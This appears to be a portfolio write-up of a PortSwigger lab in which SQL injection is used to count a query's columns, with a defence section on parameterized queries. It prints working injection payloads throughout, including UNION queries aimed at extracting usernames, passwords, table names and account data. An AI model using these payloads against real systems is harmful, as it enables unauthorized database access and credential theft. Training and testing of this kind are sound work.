# Lab 8: SQL Injection UNION Attack - Determining Number of Columns

## Executive Summary

This lab demonstrates fundamental SQL injection exploitation focused on discovering the column structure of database queries through systematic enumeration techniques. By employing two complementary methods—ORDER BY clause progression and NULL-based UNION injection—I successfully determined that the target query returns exactly 3 columns. This column enumeration is a critical prerequisite for advanced SQL injection attacks, enabling UNION-based data exfiltration and complete database compromise. The dual-method verification showcases comprehensive penetration testing methodology and confirms query structure with certainty.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection - Column Enumeration |
| **Risk**               | High - Foundation for Data Exfiltration |
| **Completion**         | February 15, 2026 |

## Objective

Exploit SQL injection vulnerability to systematically determine the number of columns returned by the database query using ORDER BY and UNION SELECT NULL techniques.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- URL encoding for payload delivery

**Target:** Product category filtering with SQL injection vulnerability

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection UNION attack, determining the number of columns returned by the query" challenge.

<img width="1920" height="982" alt="LAB2_ss1" src="https://github.com/user-attachments/assets/33276b0c-f237-4d69-a2e6-918016dfdb90" />

*Lab 8 environment - Column enumeration challenge with Burp Suite Professional configured*

### 2. Attack Surface Identification

Explored product categories to identify SQL injection vectors and understand application behavior.

<img width="1920" height="982" alt="LAB2_ss2" src="https://github.com/user-attachments/assets/8cc89fac-d5cf-48d4-810d-1ddc07fd78a9" />

*Category exploration - Pets, Food & Drink, Toys & Games | HTTP request showing category=Pets parameter*

**Available Categories:**
- Pets
- Food & Drink
- Toys & Games
- Other product categories

**Request Captured:**
```http
GET /filter?category=Pets HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Backend SQL Query (Inferred):**
```sql
SELECT * FROM products WHERE category = 'Pets'
```

**Attack Vector:** The `category` parameter filters database results, likely incorporated directly into SQL WHERE clause.

### 3. Column Enumeration - ORDER BY Method

**Technique Overview:**
The ORDER BY clause sorts results by column number. If the specified column doesn't exist, the database returns an error. This allows systematic column counting.

**Methodology:**
Increment ORDER BY column number until an error occurs, indicating the maximum column count has been exceeded.

Sent request to Burp Repeater and began systematic column enumeration.

**Test Payload 1:**
```http
GET /filter?category=Pets'+ORDER+BY+1-- HTTP/1.1
```

**Response:** 200 OK
**Analysis:** Column 1 exists

**Test Payload 2:**
```http
GET /filter?category=Pets'+ORDER+BY+2-- HTTP/1.1
```

**Response:** 200 OK
**Analysis:** Column 2 exists

**Test Payload 3:**
```http
GET /filter?category=Pets'+ORDER+BY+3-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss3 1" src="https://github.com/user-attachments/assets/ae9e4fa1-697e-499c-b395-5154a0bf567d" />

*ORDER BY 3 test - 200 OK response confirms 3 columns exist*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Pets' ORDER BY 3--'
```

**Response:** 200 OK
**Analysis:** Column 3 exists

**Test Payload 4:**
```http
GET /filter?category=Pets'+ORDER+BY+4-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB2_ss3 2" src="https://github.com/user-attachments/assets/60c01ffc-9edb-4ef9-aec9-a88882549c18" />

*ORDER BY 4 test - 500 Internal Server Error confirms only 3 columns*

**SQL Query Attempted:**
```sql
SELECT * FROM products WHERE category = 'Pets' ORDER BY 4--'
```

**Response:** 500 Internal Server Error

**Database Error (Inferred):**
```
Column '4' does not exist
```

**Column Count Determined:** Exactly **3 columns** using ORDER BY method.

### 4. Verification - NULL-Based UNION Method

**Technique Overview:**
UNION queries must have matching column counts. By progressively adding NULL values until the query succeeds, we can independently verify column count.

**Why Use NULL:**
- NULL is compatible with any data type
- Avoids type mismatch errors
- Works across all database systems

**Test Payload 1:**
```http
GET /filter?category=Pets'+UNION+SELECT+NULL-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB2_ss4 1" src="https://github.com/user-attachments/assets/c3885931-9fa0-42ca-b532-cf274f9d4b1a" />

*UNION SELECT NULL test - 500 Internal Server Error indicates column count mismatch*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Pets' 
UNION SELECT NULL--'
```

**Response:** 500 Internal Server Error

**Analysis:** Single NULL column doesn't match original query (which has 3 columns). UNION requires equal column counts.

**Test Payload 2:**
```http
GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss4 2" src="https://github.com/user-attachments/assets/afd26b59-706f-43cf-8896-ee7529f04842" />

*UNION SELECT NULL,NULL,NULL test - 200 OK confirms 3 columns*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Pets' 
UNION SELECT NULL, NULL, NULL--'
```

**Response:** 200 OK

**Column Count Confirmed:** Exactly **3 columns** verified using NULL-based UNION method.

**Dual-Method Validation:**
- ✅ ORDER BY method: 3 columns
- ✅ UNION NULL method: 3 columns
- ✅ Both methods agree - high confidence

### 5. Lab Completion

Demonstrated successful column enumeration by accessing the result in browser.

<img width="1920" height="982" alt="LAB2_ss5" src="https://github.com/user-attachments/assets/c559c750-e378-4bd9-b37a-640e5f115a92" />

*Lab completion confirmed - 3 columns successfully determined*

**Attack Success:**
- ✅ SQL injection vulnerability exploited
- ✅ Column count determined (3 columns)
- ✅ Dual verification methods applied
- ✅ Foundation established for advanced attacks

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: High (CVSS 7.5)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly incorporated into SQL queries
- No parameterized queries or input sanitization
- Enables database structure enumeration
- Foundation for data exfiltration attacks

**Why Column Enumeration Matters:**

Column enumeration is the **critical first step** for advanced SQL injection exploitation:

**1. UNION-Based Data Exfiltration:**
```sql
-- Without knowing column count, this fails
' UNION SELECT username, password-- (Error: wrong column count)

-- With column count (3), this works
' UNION SELECT username, password, NULL FROM users--
```

**2. Data Extraction Requirements:**
- UNION queries require matching column counts
- Each SELECT must return same number of columns
- Column enumeration identifies this requirement

**3. Attack Progression:**
```
Column Enumeration (Completed)
        ↓
Data Type Identification
        ↓
Database Version Discovery
        ↓
Table Enumeration
        ↓
Column Enumeration (specific tables)
        ↓
Credential Extraction
        ↓
Complete Database Compromise
```

**Column Enumeration Techniques Comparison:**

| Method | Technique | Advantages | Disadvantages |
|--------|-----------|------------|---------------|
| **ORDER BY** | `' ORDER BY 1--`, `' ORDER BY 2--`, etc. | Fast, works on all databases | Requires multiple requests |
| **UNION NULL** | `' UNION SELECT NULL--`, add NULLs until success | Confirms UNION compatibility | Slower, more requests |
| **Error Messages** | Trigger errors showing column count | Single request | Requires verbose error messages |

**Attack Methodology:**

**Phase 1 - Column Enumeration (Completed):**
```sql
' ORDER BY 1--  (200 OK)
' ORDER BY 2--  (200 OK)
' ORDER BY 3--  (200 OK)
' ORDER BY 4--  (500 Error)
Result: 3 columns

Verification:
' UNION SELECT NULL,NULL,NULL--  (200 OK)
```

**Phase 2 - Data Type Discovery (Next Step):**
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
Identify which columns accept string data
```

**Phase 3 - Information Extraction:**
```sql
' UNION SELECT version(), NULL, NULL--
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
```

**Real-World Attack Scenarios:**

| Application | Column Count | Exploitation Example |
|-------------|--------------|----------------------|
| **E-Commerce** | 3 columns | `' UNION SELECT username, password, email FROM users--` |
| **Blog Platform** | 4 columns | `' UNION SELECT title, content, author, date FROM posts--` |
| **Banking** | 5 columns | `' UNION SELECT account_num, balance, name, NULL, NULL FROM accounts--` |

**Why Dual Verification is Professional:**

Using both ORDER BY and UNION NULL methods demonstrates:
- **Thoroughness:** Multiple techniques confirm findings
- **Reliability:** Reduces chance of false positives
- **Understanding:** Shows knowledge of alternative methods
- **Professionalism:** Industry-standard approach

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic column enumeration using multiple techniques
- ORDER BY progression for rapid counting
- NULL-based UNION verification for confirmation
- Dual-method validation for reliability

**Critical Security Insights:**

**1. Column Enumeration is Foundational:**
All advanced SQL injection attacks require knowing:
- Exact column count in original query
- Data types of each column
- Which columns render in application output

**2. ORDER BY Technique:**

**How It Works:**
```sql
SELECT col1, col2, col3 FROM products WHERE category = 'Pets' ORDER BY 1--  (Success)
SELECT col1, col2, col3 FROM products WHERE category = 'Pets' ORDER BY 2--  (Success)
SELECT col1, col2, col3 FROM products WHERE category = 'Pets' ORDER BY 3--  (Success)
SELECT col1, col2, col3 FROM products WHERE category = 'Pets' ORDER BY 4--  (Error!)
```

**Advantages:**
- Fast (binary search possible)
- Works on all SQL databases
- Minimal requests needed

**3. NULL-Based UNION Technique:**

**How It Works:**
```sql
-- Original query returns 3 columns
SELECT col1, col2, col3 FROM products

-- UNION with 1 NULL fails (column count mismatch)
UNION SELECT NULL  (Error)

-- UNION with 3 NULLs succeeds (column count matches)
UNION SELECT NULL, NULL, NULL  (Success!)
```

**Advantages:**
- Confirms UNION compatibility
- Verifies column count independently
- NULL works with any data type

**4. Next Steps After Column Enumeration:**

**Immediate Next Actions:**
```sql
-- Test which columns accept strings
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--

-- Extract database version
' UNION SELECT @@version, NULL, NULL--

-- Enumerate tables
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
```

**5. Defense Requires Preventing Injection:**

**Vulnerable Code:**
```python
query = "SELECT * FROM products WHERE category = '" + category + "'"
```

**Secure Code:**
```python
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, [category])
```

**Why This Prevents All Column Enumeration:**
- User input never interpreted as SQL code
- ORDER BY and UNION attempts treated as literal strings
- Database structure completely protected
- No enumeration possible

**Professional Skills Demonstrated:**
- Systematic column enumeration methodology
- Multiple technique application (ORDER BY, UNION NULL)
- Verification and validation approach
- Understanding of SQL injection progression
- Foundation for advanced exploitation

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. OWASP SQL Injection Prevention Cheat Sheet
5. SQL Injection Cheat Sheet - Column Enumeration Techniques

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems or database enumeration is illegal under applicable laws worldwide.
